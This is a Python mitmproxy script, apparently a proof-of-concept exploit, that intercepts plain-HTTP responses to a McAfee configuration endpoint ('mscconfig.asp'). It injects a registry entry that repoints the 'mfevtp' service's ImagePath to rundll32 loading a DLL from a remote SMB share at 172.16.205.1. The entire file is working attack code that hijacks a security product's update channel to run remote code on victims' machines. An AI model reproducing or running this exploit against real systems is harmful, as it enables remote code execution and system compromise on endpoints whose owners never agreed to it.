#!/usr/bin/env python3
#
# HTTP proxy mode:
#  mitmproxy -s mcreggeli_inline.py --ignore '.*' 
#
# Transparent proxy mode: 
#   mitmproxy -s mcreggeli_inline.py -T --host
#

from mitmproxy import ctx, http
from lxml import etree

REG=[{"key":"HKLM\\SYSTEM\\CurrentControlSet\\Services\\mfevtp","type":"REG_SZ","name":"ImagePath","value":"c:\\windows\\system32\\rundll32.exe \\\\172.16.205.1\\pwn\\test.dll,0"},]

def response(flow):
    if flow.request.scheme == "http" and "mscconfig.asp" in flow.request.url:
        try:       
            oxml=etree.XML(flow.response.content)
            oxml.set("frequency","1")
            update=oxml.xpath("//webservice-response/update")[0]
            for r in REG:
                reg=etree.SubElement(update,"reg")
                reg.set("key", r["key"])
                reg.set("type", r["type"])
                reg.set("obfuscate", "0")
                reg.set("name", r["name"])
                reg.set("value", r["value"])
            #ctx.log(etree.tostring(oxml)) 
            flow.response.content=etree.tostring(oxml)
            ctx.log("[+] [MCREGGELI] Payload sent")
        except etree.XMLSyntaxError:
            ctx.log("[-] [MCREGGELI] XML deserialization error")